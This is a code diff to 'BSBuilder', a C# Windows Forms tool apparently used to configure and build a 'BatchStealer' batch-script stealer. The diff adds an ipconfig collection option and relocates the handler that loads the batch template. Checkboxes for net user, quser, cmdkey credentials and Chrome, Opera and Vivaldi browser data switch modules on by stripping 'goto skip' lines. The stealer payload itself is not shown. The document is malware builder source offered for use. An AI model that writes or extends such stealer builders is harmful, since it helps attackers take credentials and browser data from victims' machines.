@@ -22,6 +22,7 @@ namespace BSBuilder
         bool netuser = Properties.Settings.Default.netuser;
         bool quser = Properties.Settings.Default.quser;
         bool cmdkey = Properties.Settings.Default.cmdkey;
+        bool ipconfig = Properties.Settings.Default.ipconfig;
         bool chrome = Properties.Settings.Default.chrome;
         bool opera = Properties.Settings.Default.opera;
         bool vivaldi = Properties.Settings.Default.vivaldi;
@@ -62,6 +63,7 @@ namespace BSBuilder
             netusercheckbox.Checked = Properties.Settings.Default.netuser;
             qusercheckbox.Checked = Properties.Settings.Default.quser;
             cmdkeycheckbox.Checked = Properties.Settings.Default.cmdkey;
+            ipconfigcheckbox.Checked = Properties.Settings.Default.ipconfig;
             chromecheckbox.Checked = Properties.Settings.Default.chrome;
             operacheckbox.Checked = Properties.Settings.Default.opera;
             vivaldicheckbox.Checked = Properties.Settings.Default.vivaldi;
@@ -125,6 +127,30 @@ namespace BSBuilder
             catch { MessageBox.Show("Failed to load batch from " + batchfetchURL, "Critical error"); }
         }
 
+        private void searchbatchbutton_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog file = new OpenFileDialog();
+            file.InitialDirectory = AppDomain.CurrentDomain.BaseDirectory;
+            file.Title = "Select the bat you want to build (Needs to be BatchStealer)";
+            file.Filter = "Batch script (*.bat*)|*.bat*";
+            file.RestoreDirectory = true;
+            if (file.ShowDialog() == DialogResult.OK)
+            {
+                try
+                {
+                    batch = File.ReadAllText(Path.GetFullPath(file.FileName));
+                    richtextbox.Text = batch;
+
+                    batchlocation = Path.GetFullPath(file.FileName);
+                    batchlocationtextbox.Text = batchlocation;
+                }
+                catch
+                {
+                    MessageBox.Show("Failed to load the batch file.", "Fail");
+                }
+            }
+        }
+
         void removeGOTO(string data)
         {
             batch = batch.Replace(data, string.Empty);
@@ -171,6 +197,8 @@ namespace BSBuilder
                         removeGOTO("goto skipquser");
                     if (cmdkey)
                         removeGOTO("goto skipcmdkey");
+                    if (ipconfig)
+                        removeGOTO("goto skipipconfig");
                     if (chrome)
                         removeGOTO("goto skipchrome");
                     if (opera)
@@ -570,6 +598,18 @@ namespace BSBuilder
             }
         }
 
+        private void ipconfigcheckbox_CheckedChanged(object sender, EventArgs e)
+        {
+            if (ipconfigcheckbox.Checked)
+            {
+                ipconfig = true;
+            }
+            else
+            {
+                ipconfig = false;
+            }
+        }
+
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
             Properties.Settings.Default.fetchurl = batchfetchURL;
@@ -581,6 +621,7 @@ namespace BSBuilder
             Properties.Settings.Default.netuser = netuser;
             Properties.Settings.Default.quser = quser;
             Properties.Settings.Default.cmdkey = cmdkey;
+            Properties.Settings.Default.ipconfig = ipconfig;
             Properties.Settings.Default.chrome = chrome;
             Properties.Settings.Default.opera = opera;
             Properties.Settings.Default.vivaldi = vivaldi;
@@ -609,30 +650,6 @@ namespace BSBuilder
             Properties.Settings.Default.batchlocation = batchlocation;
 
             Properties.Settings.Default.Save();
-        }
-
-        private void searchbatchbutton_Click(object sender, EventArgs e)
-        {
-            OpenFileDialog file = new OpenFileDialog();
-            file.InitialDirectory = AppDomain.CurrentDomain.BaseDirectory;
-            file.Title = "Select the bat you want to build (Needs to be BatchStealer)";
-            file.Filter = "Batch script (*.bat*)|*.bat*";
-            file.RestoreDirectory = true;
-            if (file.ShowDialog() == DialogResult.OK)
-            {
-                try
-                {
-                    batch = File.ReadAllText(Path.GetFullPath(file.FileName));
-                    richtextbox.Text = batch;
-
-                    batchlocation = Path.GetFullPath(file.FileName);
-                    batchlocationtextbox.Text = batchlocation;
-                }
-                catch
-                {
-                    MessageBox.Show("Failed to load the batch file.", "Fail");
-                }
-            }
         }
     }
 }
